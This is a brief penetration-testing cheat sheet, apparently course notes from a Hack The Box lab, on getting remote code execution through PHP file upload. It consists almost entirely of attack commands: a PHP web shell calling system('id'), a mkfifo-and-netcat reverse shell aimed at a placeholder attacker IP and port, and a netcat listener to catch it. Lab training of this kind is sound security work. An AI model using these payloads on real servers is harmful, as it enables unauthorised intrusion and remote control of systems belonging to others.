# Testing RCE

## PHP File Upload Test

The following snippet can be used to test for code execution.

### Code: `php`

    <?php system('id'); ?>

## Reverse Shell `PHP` Script

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f

## Upload the file again and start a `netcat` listener in our terminal:

    MBWest@htb[/htb]$ nc -lvnp 9443
